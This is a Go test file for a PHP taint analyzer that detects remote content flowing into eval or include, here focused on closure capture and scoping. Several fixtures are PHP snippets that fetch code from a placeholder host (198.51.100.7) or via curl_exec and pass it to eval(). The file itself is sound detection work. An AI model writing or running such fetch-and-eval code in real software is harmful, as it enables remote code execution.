func TestClosureCaptureOfTaintedValueIsRecorded(t *testing.T) {
	for _, tc := range []struct{ name, fixture string }{
		{"use clause", fxCaptureTainted},
		{"arrow function", fxCaptureTaintedArrow},
	} {
		t.Run(tc.name, func(t *testing.T) {
			rep := run(t, tc.fixture)
			if rep.Status != StatusAnalyzed {
				t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
			}
			if !slices.Contains(rep.PrecisionLoss, "closure-capture") {
				t.Fatalf("precision loss = %v, want it to record closure-capture", rep.PrecisionLoss)
			}
		})
	}
}

// TestClosureCaptureOfCleanValueIsNotRecorded is the gate that keeps the
// marker worth reading. Capturing is ordinary PHP -- a use() clause or an
// arrow function appears in 14.6% of the files this analyzer looks at -- so a
// marker raised on the shape alone would fire on roughly one analyzed file in
// seven and tell an operator nothing. It is raised only when the captured
// value was actually tainted, i.e. only when taint really was dropped.
func TestClosureCaptureOfCleanValueIsNotRecorded(t *testing.T) {
	rep := run(t, fxCaptureClean)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if slices.Contains(rep.PrecisionLoss, "closure-capture") {
		t.Fatalf("precision loss = %v, want no closure-capture for an untainted capture", rep.PrecisionLoss)
	}
}

// TestClosureParameterIsNotACapture separates the two ways an outer name can
// reappear inside a closure. A parameter that happens to share an outer
// variable's name is the closure's OWN binding and receives nothing from the
// enclosing scope, so nothing is dropped and nothing is reported. Treating it
// as a capture would both raise a useless marker and re-open the shadowing
// false positive that scoping closures exists to prevent.
func TestClosureParameterIsNotACapture(t *testing.T) {
	rep := run(t, fxCaptureParamShadow)
	if len(rep.Results) != 0 {
		t.Fatalf("results = %+v, want none for a shadowing parameter", rep.Results)
	}
	if slices.Contains(rep.PrecisionLoss, "closure-capture") {
		t.Fatalf("precision loss = %v, want no closure-capture for a parameter", rep.PrecisionLoss)
	}
}

// TestCaptureThenReassignStaysClean guards the false positive that rules out
// seeding captured taint into the body. The include reads a local literal, so
// the file is clean and must report no result. The capture itself is still a
// real drop and is still recorded.
func TestCaptureThenReassignStaysClean(t *testing.T) {
	rep := run(t, fxCaptureThenReassign)
	if len(rep.Results) != 0 {
		t.Fatalf("results = %+v, want none when the capture is reassigned before use", rep.Results)
	}
	if !slices.Contains(rep.PrecisionLoss, "closure-capture") {
		t.Fatalf("precision loss = %v, want the dropped capture still recorded", rep.PrecisionLoss)
	}
}

// TestCapturePropagatesThroughArrowParents covers PHP's transitive implicit
// capture rule. A nested closure's use() clause, or a nested arrow's direct
// variable read, requires every enclosing arrow to capture that binding so it
// is available when the nested declaration is created. Scope isolation must
// not make that dropped outer value disappear from the precision marker.
func TestCapturePropagatesThroughArrowParents(t *testing.T) {
	for _, tc := range []struct{ name, fixture string }{
		{"closure in arrow", fxCaptureThroughArrow},
		{"arrow in arrow", fxCaptureThroughNestedArrow},
		{"function-local through arrow", fxFunctionCaptureThroughArrow},
	} {
		t.Run(tc.name, func(t *testing.T) {
			rep := run(t, tc.fixture)
			if len(rep.Results) != 0 {
				t.Fatalf("results = %+v, want capture tracking not to change detection", rep.Results)
			}
			if !slices.Contains(rep.PrecisionLoss, "closure-capture") {
				t.Fatalf("precision loss = %v, want the transitive capture recorded", rep.PrecisionLoss)
			}
		})
	}
}

// TestCaptureDoesNotCrossNonCapturingBindings makes the transitive rule stop
// at real lexical boundaries. An arrow parameter supplies its own value, and
// an ordinary closure receives no outer binding without use(), so neither
// nested declaration captures the tainted top-level variable.
func TestCaptureDoesNotCrossNonCapturingBindings(t *testing.T) {
	for _, tc := range []struct{ name, fixture string }{
		{"arrow parameter", fxCaptureBlockedByArrowParam},
		{"ordinary closure", fxCaptureBlockedByClosure},
		{"named function", fxCaptureBlockedByFunction},
	} {
		t.Run(tc.name, func(t *testing.T) {
			rep := run(t, tc.fixture)
			if len(rep.Results) != 0 {
				t.Fatalf("results = %+v, want none across a lexical boundary", rep.Results)
			}
			if slices.Contains(rep.PrecisionLoss, "closure-capture") {
				t.Fatalf("precision loss = %v, want no transitive capture", rep.PrecisionLoss)
			}
		})
	}
}

var (
	// Each of these declares a top-level arrow function so that the top-level
	// scope is one a capture could be resolved against at all; without it the
	// walk never reaches the top level and the case would pass for the wrong
	// reason. The sink then sits inside a NAMED function, closure, or method,
	// none of which receives the outer $payload -- only an arrow function
	// forwards enclosing bindings implicitly.
	fxBoundaryNamedFunction = b64(`<?php
$payload = file_get_contents('http://198.51.100.7/x');
$probe = fn() => $unrelated;
function h() { return fn() => eval($payload); }`)

	fxBoundaryClosure = b64(`<?php
$payload = file_get_contents('http://198.51.100.7/x');
$probe = fn() => $unrelated;
$h = function() { return fn() => eval($payload); };`)

	fxBoundaryMethod = b64(`<?php
$payload = file_get_contents('http://198.51.100.7/x');
$probe = fn() => $unrelated;
class K { function m() { return fn() => eval($payload); } }`)

	fxBoundaryRealCapture = b64(`<?php
$payload = file_get_contents('http://198.51.100.7/x');
$probe = fn() => $unrelated;
$h = fn() => eval($payload);`)
)

// TestCaptureStopsAtNonArrowScopeBoundary pins the reset that separates one
// lexical scope's bindings from another's during capture analysis. An arrow
// function forwards its enclosing bindings, so the walk deliberately carries
// them across arrow boundaries; a named function, an ordinary closure, and a
// method do not, and must start clean. Without the reset, a variable named in
// any of those bodies matches an identically named tainted variable from an
// unrelated outer scope and raises a marker on code that captured nothing --
// the same name-collision class the package's scope isolation exists to stop.
func TestCaptureStopsAtNonArrowScopeBoundary(t *testing.T) {
	for _, tc := range []struct{ name, fixture string }{
		{"named function", fxBoundaryNamedFunction},
		{"closure", fxBoundaryClosure},
		{"method", fxBoundaryMethod},
	} {
		t.Run(tc.name, func(t *testing.T) {
			rep := run(t, tc.fixture)
			if rep.Status != StatusAnalyzed {
				t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
			}
			if slices.Contains(rep.PrecisionLoss, "closure-capture") {
				t.Fatalf("precision loss = %v, want no closure-capture: %s bodies do not receive an outer binding", rep.PrecisionLoss, tc.name)
			}
		})
	}

	// The positive control differs from the three above only in which scope
	// holds the sink, so a fix that silenced the marker everywhere would fail
	// here rather than look like a pass.
	rep := run(t, fxBoundaryRealCapture)
	if !slices.Contains(rep.PrecisionLoss, "closure-capture") {
		t.Fatalf("precision loss = %v, want closure-capture for a real arrow capture", rep.PrecisionLoss)
	}
}

var (
	fxCapturePropertyPath = b64(`<?php
$o = new stdClass();
$o->body = file_get_contents('http://198.51.100.7/x');
$f = function() use ($o) { eval($o->body); };`)

	fxCaptureThisClosure = b64(`<?php
class K {
	private $b;
	function m($c) { $this->b = curl_exec($c); return function() { eval($this->b); }; }
}`)

	fxCaptureThisArrow = b64(`<?php
class K {
	private $b;
	function m($c) { $this->b = curl_exec($c); return fn() => eval($this->b); }
}`)

	fxCapturePropertyClean = b64(`<?php
$o = new stdClass();
$o->body = 'local literal';
$unused = curl_exec($c);
include __DIR__ . '/parts/header.php';
$f = function() use ($o) { echo $o->body; };`)

	fxCaptureThisClean = b64(`<?php
class K {
	private $b = 'local.php';
	function m($c) { $unused = curl_exec($c); include $this->b; return function() { echo $this->b; }; }
}`)

	fxCaptureThisStaticClosure = b64(`<?php
class K {
	private $b;
	function m($c) { $this->b = curl_exec($c); return static function() { eval($this->b); }; }
}`)

	fxCaptureThisStaticArrow = b64(`<?php
class K {
	private $b;
	function m($c) { $this->b = curl_exec($c); return static fn() => eval($this->b); }
}`)

	fxCaptureThisThroughStaticArrow = b64(`<?php
class K {
	private $b;
	function m($c) { $this->b = curl_exec($c); return static fn() => fn() => eval($this->b); }
}`)

	fxCaptureThisThroughClosureArrow = b64(`<?php
class K {
	private $b;
	function m($c) { $this->b = curl_exec($c); return function() { return fn() => eval($this->b); }; }
}`)

	fxCaptureThisThroughNestedClosure = b64(`<?php
class K {
	private $b;
	function m($c) { $this->b = curl_exec($c); return function() { return function() { eval($this->b); }; }; }
}`)

	fxCaptureThisThroughStaticClosure = b64(`<?php
class K {
	private $b;
	function m($c) { $this->b = curl_exec($c); return static function() { return fn() => eval($this->b); }; }
}`)

	fxCaptureThisThroughClosureClean = b64(`<?php
class K {
	private $b = 'local.php';
	function m($c) { $unused = curl_exec($c); include $this->b; return function() { return fn() => $this->b; }; }
}`)

	fxCaptureOtherThroughStaticArrow = b64(`<?php
class K {
	function m($c) { $payload = curl_exec($c); return static fn() => eval($payload); }
}`)
)

// TestCaptureOfPropertyPathIsRecorded covers the two ways a captured binding
// can hold taint under a name the capture itself does not spell. Taint on a
// property is keyed by its whole access path ("o->body"), while what the
// closure captures is the base variable ($o), so matching capture names against
// taint keys literally misses it. $this is the sharper case: a non-static
// closure receives it implicitly, so it never appears in a use() clause at all.
// Both drop a value the closure really does receive, and this package treats an
// unrecorded drop as a silent false negative.
func TestCaptureOfPropertyPathIsRecorded(t *testing.T) {
	for _, tc := range []struct{ name, fixture string }{
		{"use clause on a property path", fxCapturePropertyPath},
		{"implicit $this in a closure", fxCaptureThisClosure},
		{"implicit $this in an arrow function", fxCaptureThisArrow},
	} {
		t.Run(tc.name, func(t *testing.T) {
			rep := run(t, tc.fixture)
			if rep.Status != StatusAnalyzed {
				t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
			}
			if !slices.Contains(rep.PrecisionLoss, "closure-capture") {
				t.Fatalf("precision loss = %v, want closure-capture", rep.PrecisionLoss)
			}
		})
	}
}

// TestCaptureOfCleanPropertyPathIsNotRecorded keeps the widened matching
// gated. Capturing an object or receiving $this is ordinary in any OO PHP
// file, so neither may raise a marker on its own account.
func TestCaptureOfCleanPropertyPathIsNotRecorded(t *testing.T) {
	for _, tc := range []struct{ name, fixture string }{
		{"clean property path", fxCapturePropertyClean},
		{"clean $this", fxCaptureThisClean},
	} {
		t.Run(tc.name, func(t *testing.T) {
			rep := run(t, tc.fixture)
			if rep.Status != StatusAnalyzed {
				t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
			}
			if slices.Contains(rep.PrecisionLoss, "closure-capture") {
				t.Fatalf("precision loss = %v, want no closure-capture on a clean capture", rep.PrecisionLoss)
			}
		})
	}
}

// TestStaticCaptureDoesNotReceiveThis keeps the implicit-$this extension
// aligned with PHP's binding rules. A static closure or arrow function does
// not receive the declaring object's $this, and a static arrow also blocks
// that binding from reaching a declaration nested inside it. Ordinary
// variables remain implicit captures of a static arrow.
func TestStaticCaptureDoesNotReceiveThis(t *testing.T) {
	for _, tc := range []struct{ name, fixture string }{
		{"static closure", fxCaptureThisStaticClosure},
		{"static arrow", fxCaptureThisStaticArrow},
		{"nested arrow across static arrow", fxCaptureThisThroughStaticArrow},
		{"nested arrow across static closure", fxCaptureThisThroughStaticClosure},
	} {
		t.Run(tc.name, func(t *testing.T) {
			rep := run(t, tc.fixture)
			if rep.Status != StatusAnalyzed {
				t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
			}
			if slices.Contains(rep.PrecisionLoss, "closure-capture") {
				t.Fatalf("precision loss = %v, want no closure-capture: static declarations do not receive $this", rep.PrecisionLoss)
			}
		})
	}

	rep := run(t, fxCaptureOtherThroughStaticArrow)
	if !slices.Contains(rep.PrecisionLoss, "closure-capture") {
		t.Fatalf("precision loss = %v, want closure-capture for an ordinary variable captured by a static arrow", rep.PrecisionLoss)
	}
}

// TestThisCapturePropagatesThroughClosureParents covers $this's exception to
// the ordinary-closure boundary rule. A non-static closure is automatically
// bound to the current object, so a nested declaration can receive $this from
// it even when the enclosing closure's own facts contain no direct $this read.
// A static closure remains a hard boundary, as the control above asserts.
func TestThisCapturePropagatesThroughClosureParents(t *testing.T) {
	for _, tc := range []struct{ name, fixture string }{
		{"arrow", fxCaptureThisThroughClosureArrow},
		{"closure", fxCaptureThisThroughNestedClosure},
	} {
		t.Run(tc.name, func(t *testing.T) {
			rep := run(t, tc.fixture)
			if rep.Status != StatusAnalyzed {
				t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
			}
			if !slices.Contains(rep.PrecisionLoss, "closure-capture") {
				t.Fatalf("precision loss = %v, want closure-capture through non-static closure", rep.PrecisionLoss)
			}
		})
	}

	rep := run(t, fxCaptureThisThroughClosureClean)
	if slices.Contains(rep.PrecisionLoss, "closure-capture") {
		t.Fatalf("precision loss = %v, want no closure-capture through a clean non-static closure", rep.PrecisionLoss)
	}
}

var (
	// The two declarations are separated by zero bytes. PHP allows it and
	// minifiers emit it routinely, so it must not change how the file is
	// scoped.
	fxAdjacentFunctions = b64(`<?php
$payload = 'header.php';
include $payload;
function a(){}function b($c){ $payload = curl_exec($c); }`)

	fxAdjacentClasses = b64(`<?php
$payload = 'header.php';
include $payload;
class A{}class B{ function m($c){ $payload = curl_exec($c); } }`)

	// Identical but for one space, which is the control: if the spaced form
	// is also dirty the fixture proves nothing about adjacency.
	fxSpacedFunctions = b64(`<?php
$payload = 'header.php';
include $payload;
function a(){} function b($c){ $payload = curl_exec($c); }`)
)

// TestAdjacentDeclarationsAreSiblings pins the boundary arithmetic of the
// declaration sweep. A declaration's end position is exclusive, so a
// declaration starting exactly where the previous one ends is its SIBLING, not
// its child. Treating it as a child leaves it out of the enclosing scope's
// exclusion set, and its locals then leak into that scope and collide with an
// identically named variable there -- reporting a flow on a file where the two
// never meet.
func TestAdjacentDeclarationsAreSiblings(t *testing.T) {
	for _, tc := range []struct{ name, fixture string }{
		{"functions", fxAdjacentFunctions},
		{"classes", fxAdjacentClasses},
		{"spaced control", fxSpacedFunctions},
	} {
		t.Run(tc.name, func(t *testing.T) {
			rep := run(t, tc.fixture)
			if rep.Status != StatusAnalyzed {
				t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
			}
			if len(rep.Results) != 0 {
				t.Fatalf("results = %+v, want none: the tainted local belongs to another declaration", rep.Results)
			}
		})
	}
}

var (
	fxNestedParamCollision = b64(`<?php
function f($c, $rows) {
	$data = curl_exec($c);
	return array_map(fn($data) => $data->name, $rows);
}
$tpl = f($c, $rows);
include $tpl;`)

	fxNestedLocalCollision = b64(`<?php
function f($c, $rows) {
	$data = curl_exec($c);
	return array_map(function($x) { $data = 'safe.php'; return $data; }, $rows);
}
$tpl = f($c, $rows);
include $tpl;`)

	fxReturnsTaintedLocal = b64(`<?php
function f($c) { $data = curl_exec($c); return $data; }
$tpl = f($c);
include $tpl;`)

	fxReturnsCalleeInClosure = b64(`<?php
function a($c){ return curl_exec($c); }
function b($c){ return (function() use ($c) { return a($c); })(); }
$y = b($c);
eval($y);`)
)

// TestNestedDeclarationLocalsDoNotTaintTheReturn separates the two things a
// return expression is read for. Its CALLS are collected without excluding
// nested declarations, which is what lets a callee invoked inside a closure
// there contribute a summary; its VARIABLES must still be confined to the
// enclosing body, because that is whose taint state they are graded against.
// Without that split, an arrow parameter or closure local merely sharing a
// name with a tainted variable outside reports a flow on a file where the two
// never meet -- and $data, $content and $url are everywhere in real PHP.
func TestNestedDeclarationLocalsDoNotTaintTheReturn(t *testing.T) {
	for _, tc := range []struct{ name, fixture string }{
		{"arrow parameter", fxNestedParamCollision},
		{"closure local", fxNestedLocalCollision},
	} {
		t.Run(tc.name, func(t *testing.T) {
			rep := run(t, tc.fixture)
			if rep.Status != StatusAnalyzed {
				t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
			}
			if len(rep.Results) != 0 {
				t.Fatalf("results = %+v, want none: the returned value is the nested declaration's own", rep.Results)
			}
		})
	}

	// The controls are what keep the fix from being "stop grading returns".
	// A body's own tainted local must still be seen, and so must a callee
	// reached only through a closure inside the return -- the latter is the
	// exact flow the summaries worklist exists to follow.
	for _, tc := range []struct{ name, fixture, sink string }{
		{"body's own local", fxReturnsTaintedLocal, "include"},
		{"callee inside a closure", fxReturnsCalleeInClosure, "eval"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			rep := run(t, tc.fixture)
			if len(rep.Results) != 1 || rep.Results[0].Sink != tc.sink {
				t.Fatalf("results = %+v, want one flow to %s", rep.Results, tc.sink)
			}
		})
	}
}

var (
	fxSinkArrowParamCollision = b64(`<?php
$data = curl_exec($c);
$rows = [];
include array_map(fn($data) => $data->tpl, $rows)[0];`)

	fxSinkClosureLocalCollision = b64(`<?php
$data = curl_exec($c);
$rows = [];
include array_map(function($x){ $data = 'safe.php'; return $data; }, $rows)[0];`)

	fxSinkCollisionInMethod = b64(`<?php
class K {
	function m($c, $rows) { $data = curl_exec($c); include array_map(fn($data) => $data->tpl, $rows)[0]; }
}`)

	fxSinkCalleeInClosure = b64(`<?php
function fetch($c){ return curl_exec($c); }
$rows = [];
include array_map(function() use ($c) { return fetch($c); }, $rows)[0];`)

	fxSinkAliasedCalleeInClosure = b64(`<?php
use function fetchRemote as loadRemote;
function fetchRemote($c){ return curl_exec($c); }
$rows = [];
include array_map(function() use ($c) { return loadRemote($c); }, $rows)[0];`)

	fxSummaryPropertyCollision = b64(`<?php
function f($c, $rows) {
	$o = new stdClass();
	$o->name = curl_exec($c);
	return array_map(fn($o) => $o->name, $rows);
}
$tpl = f($c, $rows);
include $tpl;`)

	fxSummaryPropertyDirect = b64(`<?php
function f($c) {
	$o = new stdClass();
	$o->name = curl_exec($c);
	return $o->name;
}
$tpl = f($c);
include $tpl;`)

	// The arrow function starts at the function's closing brace with nothing
	// between, which is what makes the two declarations adjacent rather than
	// nested.
	fxAdjacentCaptureScopes = b64(`<?php
function a($c){ $p = curl_exec($c); return function() use ($k) { include $k; }; }fn() => function() use ($p) { include $p; };`)
)

// TestNestedDeclarationLocalsDoNotTaintASink is the sink-expression twin of
// TestNestedDeclarationLocalsDoNotTaintTheReturn. A sink's argument is
// collected without excluding nested declarations for the same reason a return
// expression is -- a call reached only through a closure there must still be
// followed -- so it needs the same variable-side filtering, or an arrow
// parameter sharing a name with an outer tainted variable reports a flow that
// does not exist.
func TestNestedDeclarationLocalsDoNotTaintASink(t *testing.T) {
	for _, tc := range []struct{ name, fixture string }{
		{"arrow parameter", fxSinkArrowParamCollision},
		{"closure local", fxSinkClosureLocalCollision},
		{"inside a method", fxSinkCollisionInMethod},
	} {
		t.Run(tc.name, func(t *testing.T) {
			rep := run(t, tc.fixture)
			if rep.Status != StatusAnalyzed {
				t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
			}
			if len(rep.Results) != 0 {
				t.Fatalf("results = %+v, want none: the value is the nested declaration's own", rep.Results)
			}
		})
	}

	// Control: a callee reached only through a closure inside the sink
	// expression must still be followed, which is why the calls are not
	// filtered alongside the variables.
	rep := run(t, fxSinkCalleeInClosure)
	if len(rep.Results) != 1 {
		t.Fatalf("results = %+v, want the call inside the closure still followed", rep.Results)
	}
}

// TestSinkNestedCallKeepsWholeFileAlias covers the resolved-call half of the
// deliberate split above. The sink expression is recollected without scope
// exclusion so the call inside its closure remains visible, but resolving that
// call still needs the whole-file alias index: the enclosing scope's facts
// correctly excluded the closure and therefore cannot provide its call site.
func TestSinkNestedCallKeepsWholeFileAlias(t *testing.T) {
	rep := run(t, fxSinkAliasedCalleeInClosure)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s), want StatusAnalyzed", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 1 || rep.Results[0].Sink != "include" {
		t.Fatalf("results = %+v, want aliased closure-nested flow to include", rep.Results)
	}
}

// TestNestedDeclarationPropertyReadsAreFiltered covers the property-path form
// of the same collision. Property reads are keyed by their whole access path
// rather than the bare base variable, so they travel a different field than
// plain variables and need filtering of their own; without it this fires while
// the plain-variable version stays clean.
func TestNestedDeclarationPropertyReadsAreFiltered(t *testing.T) {
	if rep := run(t, fxSummaryPropertyCollision); len(rep.Results) != 0 {
		t.Fatalf("results = %+v, want none: $o is the arrow function's own parameter", rep.Results)
	}
	if rep := run(t, fxSummaryPropertyDirect); len(rep.Results) != 1 {
		t.Fatalf("results = %+v, want the direct property read still reported", rep.Results)
	}
}

// TestAdjacentScopesDoNotShareCaptures is the capture-analysis half of the
// exclusive-end-position rule. TestAdjacentDeclarationsAreSiblings asserts on
// results and so only exercises the declaration sweep; the capture walk keeps
// its own nesting stack and moves precision loss rather than results, so it
// needs its own case. Here the arrow function begins at the function's closing
// brace, so treating it as nested would let it borrow that function's local.
func TestAdjacentScopesDoNotShareCaptures(t *testing.T) {
	rep := run(t, fxAdjacentCaptureScopes)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if slices.Contains(rep.PrecisionLoss, "closure-capture") {
		t.Fatalf("precision loss = %v, want none: the tainted local belongs to the adjacent function", rep.PrecisionLoss)
	}
}

var (
	fxEvidenceExcludesNestedLocal = b64(`<?php
function fetchit($c){ return curl_exec($c); }
$rows = [];
include array_map(function() use ($c) { $secretlocal = 'unrelated'; return fetchit($c); }, $rows)[0];`)

	fxThisWalkStopsAtNamedFunction = b64(`<?php
class K {
	private $b;
	function m($c) {
		$this->b = curl_exec($c);
		return function() {
			if (!function_exists('kg')) { function kg(){ return function(){ eval($this->b); }; } }
			return kg();
		};
	}
}`)
)

// TestEvidenceOmitsNestedDeclarationLocals keeps the reported identifiers
// aligned with what was actually graded. A nested declaration's locals are
// excluded from the taint decision, so naming them in the evidence invites a
// reviewer to trace a variable the analyzer deliberately never followed. Calls
// stay listed because calls genuinely were part of the decision.
func TestEvidenceOmitsNestedDeclarationLocals(t *testing.T) {
	rep := run(t, fxEvidenceExcludesNestedLocal)
	if len(rep.Results) != 1 {
		t.Fatalf("results = %+v, want the call inside the closure reported", rep.Results)
	}
	if slices.Contains(rep.Results[0].Identifiers, "$secretlocal") {
		t.Fatalf("identifiers = %v, want no closure-local that was excluded from grading", rep.Results[0].Identifiers)
	}
}

// TestThisCaptureWalkStopsAtANamedFunction pins where the implicit-$this walk
// gives up. PHP does bind $this to the outer closure here, so continuing the
// walk would not be factually wrong -- it would raise the marker on a closure
// that never mentions $this itself, which is the fire-on-the-shape-alone noise
// the taint gate exists to suppress. The named function between them is a
// scope PHP does not forward $this through, and stopping there is what keeps
// the marker meaning "taint was dropped here".
func TestThisCaptureWalkStopsAtANamedFunction(t *testing.T) {
	rep := run(t, fxThisWalkStopsAtNamedFunction)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if slices.Contains(rep.PrecisionLoss, "closure-capture") {
		t.Fatalf("precision loss = %v, want none: the closure never receives $this itself", rep.PrecisionLoss)
	}
}
